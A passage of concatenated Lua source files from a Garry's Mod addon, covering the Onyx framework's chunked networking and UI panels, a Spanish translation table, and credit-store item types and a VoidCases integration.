    local maxBytes = netchunk.maxBytes

    function split(data)
        local length = len(data)
        local index = 1
        local last = 1
        local chunks = {}

        for i = 1, length do
            if (i - last + 1) > maxBytes then
                chunks[index] = sub(data, last, i)
                index = index + 1
                last = i + 1
            end
        end

        chunks[index] = sub(data, last, length)

        return chunks
    end
end

local function merge(chunks)
    local result = ''

    for i = 1, #chunks do
        result = result .. chunks[i]
    end

    return result
end

function netchunk.Register(name)
    if (SERVER) then
        util.AddNetworkString('netchunk[' .. name .. ']:Send')
    end

    netchunk.registered[name] = true
    netchunk.chunks[name] = {}
end

if (SERVER) then
    local function send(ply)
        if ply then
            net.Send(ply)
        else
            net.Broadcast()
        end
    end

    function netchunk.Send(ply, name, data)
        assert(netchunk.registered[name], 'Trying to send data during unregistered channel (`' .. name .. '`)')

        local encoded = pon.encode(data)
        local chunks = split(encoded)
        local count = #chunks

        for i = 1, count do
            local chunk = chunks[i]
            local length = #chunk

            net.Start('netchunk[' .. name .. ']:Send')
                net.WriteString(name)
                net.WriteUInt(length, 16)
                net.WriteData(chunks[i], length)
                net.WriteBool(i == count)
            send(ply)
        end
    end
else
    netchunk.callbacks = netchunk.callbacks or {}

    local ReadString = net.ReadString
    local ReadUInt = net.ReadUInt
    local ReadData = net.ReadData
    local ReadBool = net.ReadBool

    function netchunk.Callback(name, callback)
        assert(name)
        assert(callback)

        net.Receive('netchunk[' .. name .. ']:Send', function()
            local name = ReadString()
            local length = ReadUInt(16)
            local chunk = ReadData(length)
            local finished = ReadBool()

            local chunks = netchunk.chunks[name]

            chunks[#chunks + 1] = chunk

            if finished then
                local raw = merge(chunks)
                local amt = #chunks

                netchunk.chunks[name] = {}

                local data = pon.decode(raw)

                callback(data, #raw, amt)
            end
        end)
    end
end
--PATH addons/____onyx_framework_2/lua/onyx/ui/traits/cl_smooth_scroll.lua:
-- I don't remember where did I get it
-- Credits to someone

local TRAIT = {}

local Approach = math.Approach
local abs = math.abs
local Clamp = math.Clamp
local RealFrameTime = RealFrameTime

function TRAIT:Init()
    self.Current = 0
end

function TRAIT:SetScroll(scrll)
	if (not self.Enabled) then self.Scroll = 0 return end

	self.Scroll = Clamp(scrll, 0, self.CanvasSize)

	self:InvalidateLayout()
end

function TRAIT:Think()
    local current = self.Current
    local target = self.Scroll

	self.Current = Approach(current, target, 10 * abs(target - current) * RealFrameTime())

    if current ~= target then
        local parent = self:GetParent()
        local func = parent.OnVScroll
        if func then
        	func(parent, self:GetOffset())
        end
    end
end

function TRAIT:GetOffset()
    if not self.Enabled then
        return 0
    end

    return self.Current * -1
end

onyx.trait.Register("smoothscroll", TRAIT)
--PATH addons/____onyx_framework_2/lua/onyx/ui/elements/cl_button.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

16/04/2022

--]]

local PANEL = {}

AccessorFunc(PANEL, 'm_colIdle', 'ColorIdle')
AccessorFunc(PANEL, 'm_colHover', 'ColorHover')
AccessorFunc(PANEL, 'm_colPressed', 'ColorPressed')
AccessorFunc(PANEL, 'm_colGradient', 'GradientColor')
AccessorFunc(PANEL, 'm_iGradientDirection', 'GradientDirection')
AccessorFunc(PANEL, 'm_bMasking', 'Masking')

local colorAccent = onyx:Config('colors.accent')

function PANEL:Init()
    self:Import('click')
    self:Import('hovercolor')
    self:SetTall(ScreenScale(10))
    self:CenterText()

    local _SetColorIdle = self.SetColorIdle
    self.SetColorIdle = function(panel, color)
        _SetColorIdle(panel, color)

        local h, s, v = ColorToHSV(color)
        if (v > .5) then
            panel:SetTextColor(color_black)
        else
            panel:SetTextColor(color_white)
        end
    end

    self:SetColorKey('backgroundColor')
    self:SetColorIdle(colorAccent)
    -- self:SetColorHover(onyx.OffsetColor(self:GetColorIdle(), -80))
    self:SetColorHover(onyx.ColorEditHSV(self:GetColorIdle(), nil, nil, .66))
    self:SetGradientDirection(RIGHT)
end

function PANEL:Paint(w, h)
    local isMaskingEnabled = self.m_bMasking
    local colorGradient = self.m_colGradient

    draw.RoundedBox(8, 0, 0, w, h, self.backgroundColor)

    if (isMaskingEnabled and colorGradient) then
        onyx.DrawWithPolyMask(self.mask, function()
            onyx.DrawMatGradient(0, 0, w, h, self.m_iGradientDirection, colorGradient)
        end)
    end
end

function PANEL:PerformLayout(w, h)
    if (self.m_bMasking) then
        self.mask = onyx.CalculateRoundedBox(8, 0, 0, w, h)
    end
end

onyx.gui.Register('onyx.Button', PANEL, 'onyx.Label')

-- ANCHOR Test

-- onyx.gui.Test('onyx.Frame', .4, .65, function(self)
--     self:MakePopup()

--     for i = 1, 10 do
--         local btn = self:Add('onyx.Button')
--         btn:Dock(TOP)
--         btn:SetText('Button #' .. i)
--         btn.DoClickInternal = function()

--         end
--         btn.DoClick = function()
--             print('test')
--         end

--         if i % 2 == 0 then
--             btn:SetDisabled(true)
--         end
--     end
-- end)
--PATH addons/____onyx_framework_2/lua/onyx/ui/elements/cl_checkbox.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

07/05/2023

--]]

local PANEL = {}

local colorPrimary = onyx:Config('colors.primary')
local colorSecondary = onyx:Config('colors.secondary')
local colorAccent = onyx:Config('colors.accent')
local wimgTick = onyx.wimg.Simple('https://i.imgur.com/TZ8Zfax.png', 'smooth mips')

AccessorFunc(PANEL, 'm_bChecked', 'Checked', FORCE_BOOL)

function PANEL:Init()
    local size = onyx.ScaleTall(18)

    self.m_bChecked = false

    self:Import('click')
    self:SetSize(size, size)

    self:Import('hovercolor')
    self:SetColorKey('outlineColor')
    self:SetColorIdle(colorSecondary)
    self:SetColorHover(colorAccent)

    self.backgroundColor = onyx.CopyColor(colorPrimary)
    self.backgroundIdleColor = colorPrimary
    self.backgroundActiveColor = colorAccent
end

function PANEL:Paint(w, h)
    local backgroundColor = self.backgroundColor
    local outlineColor = self.outlineColor
    local size = math.ceil(h * .66)

    draw.RoundedBox(8, 0, 0, w, h, outlineColor)
    draw.RoundedBox(8, 1, 1, w - 2, h - 2, backgroundColor)

    if (self.m_bChecked) then
        wimgTick:Draw(w * .5 - size * .5, h * .5 - size * .5, size, size)
    end
end

function PANEL:DoClick()
    self:SetValue(not self.m_bChecked)
end

function PANEL:SetChecked(bBool)
    assert(isbool(bBool), string.format('bad argument #1 to `SetChecked` (expected bool, got %s)', type(bBool)))
    self.m_bChecked = bBool

    if (bBool) then
        onyx.anim.Create(self, .33, {
            index = 40,
            target = {
                backgroundColor = self.backgroundActiveColor
            }
        })
    else
        onyx.anim.Create(self, .33, {
            index = 40,
            target = {
                backgroundColor = self.backgroundIdleColor
            }
        })
    end
end

function PANEL:SetValue(bBool)
    self:SetChecked(bBool)
    self:Call('OnChange', nil, bBool)
end

function PANEL:GetValue()
    return self.m_bChecked
end

onyx.gui.Register('onyx.CheckBox', PANEL)

-- ANCHOR Test

-- onyx.gui.Test('onyx.Frame', .4, .65, function(self)
--     self:MakePopup()

--     for i = 1, 10 do
--         local panel = self:Add('Panel')
--         panel:Dock(TOP)
--         panel:SetTall(ScreenScale(24))

--         local btn = panel:Add('onyx.CheckBox')
--         -- btn:Dock(LEFT)
--         btn:AlignRight(0)
--         btn:CenterVertical()
--     end
-- end)
--PATH addons/____onyx_framework_2/lua/onyx/ui/elements/cl_image_button.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

05/06/2022

--]]

local PANEL = {}

AccessorFunc(PANEL, 'm_colIdle', 'ColorIdle')
AccessorFunc(PANEL, 'm_colHover', 'ColorHover')
AccessorFunc(PANEL, 'm_colPressed', 'ColorPressed')

local ANIM_DURATION = .1

function PANEL:Init()
    self:Import('click')
    self:SetColorIdle(Color(235, 235, 235))
    self:SetColorHover(color_white)
    self:SetColorPressed(color_white)
    self:InstallScaleAnim()
    self:SetImageScale(1)
    self:SetURL('https://i.imgur.com/PnE3dNf.png', 'smooth mips')
end

function PANEL:SetColorIdle(color)
    self.m_colIdle = color
    self.m_colColor = onyx.CopyColor(color)
end

function PANEL:SetImageScale(scale)
    self.m_iImageScale = scale - .2
    self.m_iImageScaleInitial = scale
end

do
    local function animColor(panel, targetkey, duration)
        onyx.anim.Create(panel, duration or ANIM_DURATION, {
            index = onyx.anim.ANIM_HOVER,
            target = {
                m_colColor = panel[targetkey]
            }
        })
    end

    local function animScale(panel, target)
        onyx.anim.Create(panel, duration or ANIM_DURATION, {
            index = onyx.anim.ANIM_SCALE,
            target = {
                m_iImageScale = target
            }
        })
    end

    function PANEL:InstallHoverAnim()
        onyx.gui.InjectEventHandler(self, 'OnCursorEntered')
        onyx.gui.InjectEventHandler(self, 'OnCursorExited')

        self:On('OnCursorEntered', function(panel)
            if panel:GetDisabled() then return end
            animColor(panel, 'm_colHover')
        end)

        self:On('OnCursorExited', function(panel)
            if panel:GetDisabled() then return end
            animColor(panel, 'm_colIdle')
        end)

        self:On('OnPress', function(panel)
            if panel:GetDisabled() then return end
            animColor(panel, 'm_colPressed')
        end)

        self:On('OnRelease', function(panel)
            if panel:IsHovered() then
                panel:Call('OnCursorEntered')
            end
        end)
    end

    function PANEL:InstallScaleAnim()
        onyx.gui.InjectEventHandler(self, 'OnCursorEntered')
        onyx.gui.InjectEventHandler(self, 'OnCursorExited')

        self:On('OnCursorEntered', function(panel)
            if panel:GetDisabled() then return end
            animScale(panel, panel.m_iImageScaleInitial - .1)
        end)

        self:On('OnCursorExited', function(panel)
            if panel:GetDisabled() then return end
            animScale(panel, panel.m_iImageScaleInitial - .2)
        end)

        self:On('OnPress', function(panel)
            if panel:GetDisabled() then return end
            animScale(panel, panel.m_iImageScaleInitial)
        end)

        self:On('OnRelease', function(panel)
            if panel:IsHovered() then
                panel:Call('OnCursorEntered')
            end
        end)
    end

    local function animAngle(panel, target, onFinished)
        onyx.anim.Create(panel, ANIM_DURATION * 2, {
            index = 1,
            target = {
                m_iImageAngle = target
            },
            onFinished = onFinished
        })
    end

    function PANEL:InstallRotationAnim()
        self:On('OnPress', function(panel)
            if panel:GetDisabled() then return end

            animAngle(panel, 15, function(_, panel)
                animAngle(panel, -15, function(_, panel)
                    animAngle(panel, 0)
                end)
            end)
        end)
    end
end

onyx.gui.Register('onyx.ImageButton', PANEL, 'onyx.Image')
--PATH addons/____onyx_framework_2/lua/onyx/ui/elements/cl_sidebar.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

05/06/2022

--]]

local colorSecondary = onyx:Config('colors.secondary')
local colorAccent = onyx:Config('colors.accent')
local colorTertiary = onyx:Config('colors.tertiary')
local colorGray = Color(141, 141, 141)
local colorDark = Color(30, 30, 30)

local PANEL = {}

AccessorFunc(PANEL, 'm_iRoundness', 'Roundness')
AccessorFunc(PANEL, 'm_bHiddenLabels', 'HiddenLabels')

function PANEL:Init()
    self.color = Color(255, 255, 255)
    self.curLineThickness = 0
    self.animFraction = 0
    self.textColor = Color(255, 255, 255)
    self.subtextColor = onyx.CopyColor(colorGray)
    self.m_iRoundness = 8
    self.m_bHiddenLabels = false

    self:Import('click')
    self:Import('hovercolor')
    self:SetTall(onyx.ScaleTall(40))
    self:SetColorKey('color')
    self:SetColorIdle(onyx.OffsetColor(onyx:Config('colors.secondary'), 0))
    self:SetColorHover(colorTertiary)
    self:SetColorPressed(onyx:Config('colors.quaternary'))

    self.divIcon = self:Add('onyx.Image')
    self.divIcon:SetImageSize(20, 20)
    self.divIcon:SetMouseInputEnabled(false)

    self.lblTitle = self:Add('onyx.Label')
    self.lblTitle:SetText('NAME')
    self.lblTitle:SetFont(onyx.Font('Comfortaa Bold@16'))

    self.lblDesc = self:Add('onyx.Label')
    self.lblDesc:SetText('Description')
    self.lblDesc:SetContentAlignment(7)
    self.lblDesc:SetFont(onyx.Font('Comfortaa@14'))
    self.lblDesc:SetTextColor(self.subtextColor)
    self.lblDesc:Hide()
end

function PANEL:SetHiddenLabels(bBool)
    self.m_bHiddenLabels = bBool
    self.lblTitle:SetVisible(not bBool)
end

function PANEL:EnableDescription()
    self.lblTitle:SetContentAlignment(1)
    self.lblTitle:Font('Comfortaa Bold@14')
    self.lblDesc:Show()

    self:SetTall(onyx.ScaleTall(45))
end

function PANEL:PerformLayout(w, h)
    self.divIcon:Dock(LEFT)
    self.divIcon:SetWide(h)

    self.lblTitle:Dock(FILL)

    self.lblDesc:Dock(BOTTOM)
    self.lblDesc:SetTall(h * .5)

    self.lineThickness = math.ceil(ScreenScale(1))
    self.mask = onyx.CalculateRoundedBox(self.m_iRoundness, 0, 0, w, h)
end

local colorGradient = onyx.OffsetColor(colorAccent, -75)
function PANEL:Paint(w, h)
    local inset = 0

    draw.RoundedBox(self.m_iRoundness, inset, inset, w - inset * 2, h - inset * 2, self.color)

    if (self.state) then
        if (self.m_Roundness == 0) then
            onyx.DrawMatGradient(0, 0, w, h, RIGHT, ColorAlpha(colorGradient, self.animFraction * 255))
        else
            onyx.DrawWithPolyMask(self.mask, function()
                onyx.DrawMatGradient(0, 0, w, h, RIGHT, ColorAlpha(colorGradient, self.animFraction * 255))
            end)
        end
    end
end

function PANEL:Setup(data)
    assert(data.name, 'The \"name\" field is missing')
    assert(data.desc, 'The \"desc\" field is missing')

    self.lblTitle:SetText(data.name)
    self.lblDesc:SetText(data.desc)

    if (data.nameColor) then
        self.lblTitle:SetTextColor(data.nameColor)
    end

    if (data.descColor) then
        self.lblDesc:SetTextColor(data.descColor)
    end

    if (data.iconColor) then
        self.divIcon:SetColor(data.iconColor)
    end

    if data.wimg then
        self.divIcon:SetWebImage(data.wimg, 'smooth mips')
    elseif data.svg then
        self.divIcon:SetSVG(data.svg, 32)
    elseif data.icon then
        self.divIcon:SetURL(data.icon, 'smooth mips')
    elseif data.image then
        self.divIcon:SetImage(data.image, 'smooth mips')
    end

    self.data = data
end

function PANEL:SetState(bool)
    local target = bool and 1 or 0

    self:SetHoverBlocked(bool)
    self.state = bool

    if not bool then
        self:Call('OnCursorExited')
    else
        onyx.anim.Remove(self, onyx.anim.ANIM_HOVER)
        onyx.anim.Create(self, .33, {
            index = onyx.anim.ANIM_HOVER,
            target = {
                ['color'] = onyx.ColorEditHSV(colorAccent, nil, .7, .7)
            }
        })
    end

    onyx.anim.Create(self, .33, {
        index = 1,
        target = {
            textColor = (bool and colorDark or color_white),
            subtextColor = (bool and colorDark or colorGray)
        },
        think = function(anim, panel)
            panel.lblTitle:SetTextColor(panel.textColor)
            panel.divIcon:SetColor(panel.textColor)
            panel.lblDesc:SetColor(panel.subtextColor)
        end
    })

    onyx.anim.Create(self, .1, {
        index = 44,
        target = {
            animFraction = target
        }
    })
end

function PANEL:DoClick()
    self.bool = not self.bool
    self:SetState(self.bool)
end

onyx.gui.Register('onyx.Sidebar.Tab', PANEL)

--[[------------------------------
Main
--------------------------------]]

PANEL = {}

AccessorFunc(PANEL, 'm_pContainer', 'Container')
AccessorFunc(PANEL, 'm_bDescriptionEnabled', 'DescriptionEnabled')
AccessorFunc(PANEL, 'm_bKeepTabContent', 'KeepTabContent')

function PANEL:Init(arguments)
    local padding = onyx.ScaleTall(10)

    self.padding = padding
    self.tabs = {}
    self.m_bDescriptionEnabled = false
    self.m_bKeepTabContent = false

    self:DockPadding(padding, 0, padding, padding)
end

function PANEL:Paint(w, h)
    draw.RoundedBoxEx(8, 0, 0, w, h, colorSecondary, nil, nil, true)
end

function PANEL:AddTab(data)
    local btnTab = self:Add('onyx.Sidebar.Tab')
    btnTab:Setup(data)
    btnTab:Dock(TOP)
    btnTab:DockMargin(0, 0, 0, onyx.ScaleTall(5))
    btnTab.DoClick = function(panel)
        self:Call('OnTabSelected', nil, panel)
    end

    if (self:GetDescriptionEnabled()) then
        btnTab:EnableDescription()
    end

    btnTab.tabIndex = table.insert(self.tabs, btnTab)

    self:Call('OnTabAdded', nil, btnTab)

    return btnTab
end

function PANEL:ChooseTab(index)
    local tab = self.tabs[index]
    if (tab) then
        self:Call('OnTabSelected', nil, tab)
    end
end

function PANEL:OnTabSelected(panel)
    local data = panel.data

    assert(data, 'No data for a tab')

    if (self.oldTabPanel == panel) then
        return
    end

    if data.onClick and not data.onClick() then
        return
    end

    if IsValid(self.oldTabPanel) then
        self.oldTabPanel:SetState(false)
    end

    panel:Call('OnCursorEntered')
    panel:SetState(true)
    self.oldTabPanel = panel

    local container = self:GetContainer()

    assert(IsValid(container), 'You must link a valid container to the sidebar!')
    assert(data.class, 'The tab must be blocked via `onClick` or create a panel!')

    if IsValid(container.content) then
        if (self.m_bKeepTabContent) then
            container.content:Hide()
        else
            container.content:Remove()
        end
    end

    if (self.m_bKeepTabContent) then
        if (IsValid(panel.content)) then
            panel.content:Show()
        else
            panel.content = vgui.Create(data.class)
            panel.content:SetParent(container)
            panel.content:Dock(FILL)
        end
    else
        panel.content = vgui.Create(data.class)
        panel.content:SetParent(container)
        panel.content:Dock(FILL)
    end

    container.content = panel.content
    -- container.content:SetAlpha(0)
    -- container.content:AlphaTo(255, .1)

    if data.onSelected then
        data.onSelected(container.content)
    end

    -- bc OnTabSelected might be blocked by `onClick`
    self:Call('OnTabSwitched', nil, panel)
end

onyx.gui.Register('onyx.Sidebar', PANEL)

--[[------------------------------
MiniSidebar
--------------------------------]]
local PANEL = {}

function PANEL:Init()
    self.padding = 0
    self:DockPadding(0, 0, 0, 0)
end

function PANEL:OnTabAdded(tab)
    tab:SetRoundness(0)
    tab:SetHiddenLabels(true)
    tab:SetTall(self:GetWide())
end

onyx.gui.Register('onyx.MiniSidebar', PANEL, 'onyx.Sidebar')

-- ANCHOR Test

-- onyx.gui.Test('onyx.Frame', .65, .65, function(self, w, h)
--     self:MakePopup()

--     -- local sidebar = self:Add('onyx.Sidebar')
--     local sidebar = self:Add('onyx.MiniSidebar')
--     sidebar:SetWide(w * .04)
--     sidebar:Dock(LEFT)
--     -- sidebar:SetDescriptionEnabled(true)

--     local container = self:Add('Panel')
--     container:Dock(FILL)

--     sidebar:SetContainer(container)
--     sidebar:AddTab({
--         name = 'DASHBOARD',
--         desc = 'Main things',
--         class = 'DButton',
--         onSelected = function(panel)
--             panel:SetText('Meow')
--         end
--     })
--     sidebar:AddTab({
--         name = 'JOBS',
--         desc = 'Choose your destiny',
--         class = 'DButton',
--     })
--     sidebar:AddTab({
--         name = 'SHOP',
--         desc = 'Find items you need',
--         class = 'DButton',
--     })
--     sidebar:AddTab({
--         name = 'SETTINGS',
--         desc = 'Configure the game as you wish',
--         class = 'DButton',
--     })
-- end)
--PATH addons/____onyx_creditstore/lua/onyx/modules/creditstore/languages/cl_spanish.lua:
--[[

Author: Goran
Profile: https://www.gmodstore.com/users/Goran

18/05/2023

--]]

local LANG = {}

-- TABS
LANG.store_u = 'TIENDA'
LANG.inventory_u = 'INVENTARIO'
LANG.refunds_u = 'REEMBOLSO'
LANG.convert_u = 'CONVERTIR'
LANG.admin_u = 'ADMIN'
LANG.donate_u = 'DONAR'

-- ADMIN TABS
LANG.players_u = 'JUGADORES'
LANG.items_u = 'OBJETOS'
LANG.settings_u = 'AJUSTES'
LANG.return_u = 'REGRESAR'

-- WORDS
LANG.active_u = 'ACTIVO'
LANG.unactive_u = 'INACTIVO'
LANG.owned_u = 'ADQUIRIDO'
LANG.credits = 'Créditos'
LANG.money = 'Dinero'
LANG.both = 'Ambos'
LANG.convert = 'Convertir'
LANG.single = 'Único'
LANG.half = 'Medio'
LANG.all = 'Todo'
LANG.icon = 'Ícono'
LANG.model = 'Modelo'

-- OPTIONS
LANG.use = 'Usar'
LANG.equip = 'Equipar'
LANG.unequip = 'Desequipar'
LANG.spawn = 'Generar'
LANG.confirm = 'Confirmar'
LANG.cancel = 'Cancelar'
LANG.delete = 'Eliminar'

-- PHRASES
LANG.purchaseItem = 'Comprar "{item}"'
LANG.notEnoughCredits = '¡Créditos insuficientes!'
LANG.youMustBeAlive = '¡Debes estar vivo!'
LANG.requestRefund = 'Solicitar Reembolso'
LANG.refundableUntil = 'REEMBOLSABLE HASTA'
LANG.currentRate = 'Tasa actual: 1 crédito = {rate}'
LANG.youGive = 'TÚ DAS'
LANG.youReceive = 'TÚ RECIBES'
LANG.giveItem = 'DAR OBJETO'
LANG.nothingToRefund = 'NADA PARA REEMBOLSAR'
LANG.healthIsFull = '¡Tu salud está completa!'
LANG.armorIsFull = '¡Tu armadura está completa!'
LANG.youRefunded = '¡Has reembolsado el objeto {item} por {price} créditos!'
LANG.youPurchased = '¡Has adquirido el objeto {item}!'
LANG.youConverted = 'Has convertido el/la {A} a {B}!'
LANG.cantAfford = '¡No tienes el dinero suficiente para eso!'

LANG.createCategory = 'CREAR CATEGORÍA'
LANG.newItem = 'NUEVO OBJETO'
LANG.edit_u = 'EDITAR'
LANG.delete_u = 'ELIMINAR'
LANG.create_u = 'CREAR'

LANG.searchName = 'Buscar por Nombre...'
LANG.searchNameSteamID = 'Buscar por Nombre/SteamID...'

-- ERRORS
LANG.idMustBeUnique = '¡El identificador debe ser único!'
LANG.fieldMustNumber = '¡El campo {field} debe ser un número!'
LANG.fieldMustPositive = '¡El campo {field} debe ser un número positivo!'
LANG.fieldMustChoose = '¡Debes elegir el/la {field}!'
LANG.fieldEnter = '¡Debes ingresar un/a {field}!'
LANG.invalidModel = '¡El modelo es inválido!'
LANG.iconMustURL = '¡El ícono debe ser una URL!'
LANG.invalidIconFormat = '¡El ícono debe estar en formato .png o .jpg!'
LANG.notEnoughSymbols = '¡El campo {field} debe contener al menos {min} caracteres!'
LANG.tooManySymbols = '¡El campo {field} no puede contener más de {max} caracteres!'

LANG['Select an option'] = 'Seleccione una opción'

-- Types
LANG['Vehicle'] = 'Vehículo'
LANG['Health'] = 'Salud'
LANG['Armor'] = 'Armadura'
LANG['Tool'] = 'Herramienta'
LANG['Trail'] = 'Habilidad'
LANG['Permanent Booster'] = 'Potenciador permanente'
LANG['Permanent Weapon'] = 'Arma permanente'
LANG['Permanent Rank'] = 'Rango permanente'
LANG['Permanent Suit'] = 'Accesorio permanent'
LANG['Permanent Model'] = 'Modelo permanente'
LANG['Trail'] = 'Traje'
LANG['Accessory'] = 'Accesorio'
LANG['Entity'] = 'Entidad'
LANG['Experience'] = 'Experiencia'
LANG['Job'] = 'Empleo'
LANG['Money'] = 'Dinero'
LANG['Weapon'] = 'Arma'
LANG['Console Command'] = 'Comando de Consola'
LANG['Key'] = 'Clave'
LANG['Case'] = 'Caso'

-- Campos
LANG['IDENTIFICADOR'] = 'IDENTIFICADOR'
LANG['TYPE'] = 'TIPO'
LANG['NAME'] = 'NOMBRE'
LANG['PRICE'] = 'PRECIO'
LANG['ICON'] = 'ICONO'
LANG['ORDER'] = 'ORDEN'
LANG['CATEGORY'] = 'CATEGORÍA'

LANG['IDENTIFIER_Desc'] = 'Introduzca un identificador único.'
LANG['TYPE_Desc'] = 'Seleccione el tipo de asunto.'
LANG['NAME_Desc'] = 'Introduzca el nombre.'
LANG['PRICE_Desc'] = 'Introduzca el valor del elemento.'
LANG['ICON_Desc'] = 'Introduzca la imagen.'
LANG['ORDER_Desc'] = 'Introduzca un número para ordenar las categorías.'
LANG['CATEGORY_Desc'] = 'Seleccione una categoría de elementos.'

onyx.lang:AddPhrases('spanish', LANG)
--PATH addons/____onyx_creditstore/lua/onyx/modules/creditstore/cfg/integrations/sh_void_cases.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

23/05/2023

--]]
local INTEGRATION = {}

INTEGRATION.Name = 'VoidCases'
INTEGRATION.Color = Color(63, 184, 63)
INTEGRATION.Desc = 'https://www.gmodstore.com/market/view/voidcases-unboxing-system'

function INTEGRATION:Check()
    return (VoidCases ~= nil)
end

local TYPE_CASE = 2
local TYPE_KEY = 3
local voidFunction = function() end

local function registerItemType(index, key, name)
    onyx.creditstore:RegisterType('voidcases_' .. key, {
        name = name,
        fullName = '[VoidCases] ' .. name,
        color = Color(202, 233, 64),
        options = {
            ['use'] = {
                removeItem = true,
                check = function(ply, data)
                    if (not ply:Alive()) then
                        return false, onyx.lang:Get('youMustBeAlive')
                    end
    
                    return true
                end,
                func = function(ply, data)
                    local uniqueID = data.itemid
                    local item
        
                    for _, data in ipairs(VoidCases.Config.Items) do
                        if (data.id == uniqueID) then
                            item = data
                            break
                        end
                    end
    
                    if (not item) then
                        return false
                    end
    
                    VoidCases.AddItem(ply:SteamID64(), uniqueID, 1)
                    VoidCases.NetworkItem(ply, uniqueID, 1)
                    -- RCD.GiveVehicle(ply, uniqueID)
                end
            }
        },
        setupModelPanel = function(dmodel, item)
            local data = item.data.itemid
            local item

            for _, data2 in ipairs(VoidCases.Config.Items or {}) do
                if (data2.id == data) then
                    item = data2
                    break
                end
            end

            local ent = dmodel.Entity
            if (item) then
                local info = item.info

                local mn, mx = ent:GetRenderBounds()
                local size = 0
                size = math.max( size, math.abs( mn.x ) + math.abs( mx.x ) )
                size = math.max( size, math.abs( mn.y ) + math.abs( mx.y ) )
                size = math.max( size, math.abs( mn.z ) + math.abs( mx.z ) )
    
                dmodel:SetFOV( item.info.zoom or 55 )
                dmodel:SetCamPos( Vector( size, size, size ) )
                dmodel:SetLookAt( ( mn + mx ) * 0.5 )

                if (item.type == TYPE_CASE) then
                    local colorTable = info.caseColor
                    local colorVector = Vector(colorTable.r / 255, colorTable.g / 255, colorTable.b / 255)

                    if (not VoidCases.CachedMaterials[info.caseIcon]) then
                        VoidCases.FetchImage(info.caseIcon, voidFunction)
                    end

                    ent:SetNWVector('CrateColor', colorVector)
                    ent:SetNWString('CrateLogo', info.caseIcon)
                end

                dmodel.LayoutEntity = voidFunction
            end
        end,
        settings = {
            {
                key = 'itemid',
                name = 'ITEM',
                desc = 'The item.',
                icon = 'https://i.imgur.com/zgt3zea.png',
                type = 'combo',
                getOptions = function()
                    local options = {}

                    for _, data in pairs(VoidCases.Config.Items or {}) do
                        if (data.type == index) then
                            table.insert(options, {
                                text = data.name,
                                data = data.id
                            })
                        end
                    end
            
                    table.sort(options, function(a, b)
                        return a.text < b.text
                    end)
            
                    return options
                end,
                onChoose = function(index, text, data, fields)
                    local item

                    for _, data2 in pairs(VoidCases.Config.Items or {}) do
                        if (data2.id == data) then
                            item = data2
                            break
                        end
                    end

                    if (item) then
                        fields.name.entry:SetValue(item.name)
                        fields.name.entry:Highlight(onyx.GetOppositeAccentColor(), 3)

                        local icon = item.info and item.info.icon

                        if (VoidCases.IsModel(icon)) then
                            fields.icon.picker:ChooseOptionID(2)
                        else
                            fields.icon.picker:ChooseOptionID(1)
                        end

                        fields.icon.entry:SetValue(icon)
                        fields.icon.entry:Highlight(onyx.GetOppositeAccentColor(), 3)
                    end
                end,
                validateOption = function(data)
                    -- do not be lazy to do this function, it is also used on the server side to validate value
                    if (not data) then return false, 'You must choose a case!' end

                    if (SERVER) then
                        local items = VoidCases.Config.Items or {}
                        local found = false

                        for _, item in pairs(items) do
                            if (item.id == data) then
                                found = true
                                break
                            end
                        end

                        if (not found) then
                            return false, 'invalid item'
                        end
                    end
            
                    return true
                end
            }
        }
    })
end

function INTEGRATION:Load()
    VoidCases.AddCurrency('Onyx Credits', function(ply)
        local credits = onyx.creditstore:GetCredits(ply)

        if (ply:onyx_GetNetVar('store_busy')) then
            return 0
        end

        return credits
    end, function(ply, amount)
        if (amount > 0) then
            onyx.creditstore:AddCredits(ply, amount)
        else
            onyx.creditstore:TakeCredits(ply, math.abs(amount))
        end
    end)

    VoidCases.CreateAction('Onyx Credits', function (ply, value)
        onyx.creditstore:AddCredits(ply, tonumber(value))
    end, {
        varType = 'number',
        title = 'Credits'
    })

    registerItemType(TYPE_CASE, 'case', 'Case')
    registerItemType(TYPE_KEY, 'key', 'Key')
end

onyx.creditstore:RegisterIntegration('voidcases', INTEGRATION)
--PATH addons/____onyx_creditstore/lua/onyx/modules/creditstore/cfg/types/sh_model.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

01/05/2023

--]]

onyx.creditstore:RegisterType('permmodel', {
    name = 'Permanent Model',
    color = Color(228, 69, 233),
    noDuplicates = true,
    equip = true,
    uniqueEquip = true,
    onEquip = function(ply, itemTableData)
        if (not ply.onyx_OldPlayerModel) then
            ply.onyx_OldPlayerModel = ply:GetModel()
        end

        ply:SetModel(itemTableData.model)
        ply:SetupHands()
    end,
    onUnequip = function(ply, itemTableData)
        if (ply.onyx_OldPlayerModel) then
            ply:SetModel(ply.onyx_OldPlayerModel)
            ply:SetupHands()
            ply.onyx_OldPlayerModel = nil
        end
    end,
    onLoadout = function(ply, itemTableData)
        ply.onyx_OldPlayerModel = ply:GetModel()

        timer.Simple(engine.TickInterval() * 10, function()
            if (IsValid(ply)) then
                ply:SetModel(itemTableData.model)
                ply:SetupHands()
            end
        end)
    end,
    settings = {
        {
            key = 'model',
            name = 'MODEL',
            desc = 'The model path.',
            icon = 'https://i.imgur.com/zgt3zea.png',
            type = 'string',
            validateOption = function(value)
                if (value == '') then
                    return false, 'You must enter the model!'
                end
        
                if (IsUselessModel(value)) then
                    return false, 'You must enter the valid model!'
                end
        
                return true
            end
        }
    }
})
--PATH addons/____onyx_creditstore/lua/onyx/modules/creditstore/cfg/types/sh_suit.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

01/05/2023

--]]

local function createPermanentItemTypeCopy(realID, copyID, color, name)
    local typeData = onyx.creditstore.types[realID]
    if (typeData) then
        assert(typeData.options, Format('invalid item type %s to make it permanent (no options)', realID))
        assert(typeData.options.use, Format('invalid item type %s to make it permanent (no use option)', realID))

        local copy = table.Copy(typeData)
        
        copy.name = name
        copy.color = color
        copy.options.use.removeItem = nil
        copy.noDuplicates = true
        copy.stacking = nil

        onyx.creditstore:RegisterType(copyID, copy)
    end
end

onyx.netvar:Register('store_suit', {
    type = TYPE_BOOL,
    public = false
})

onyx.creditstore:RegisterType('suit', {
    name = 'Suit',
    color = Color(160, 120, 120),
    stacking = true,
    options = {
        ['use'] = {
            removeItem = true,
            check = function(ply, data)
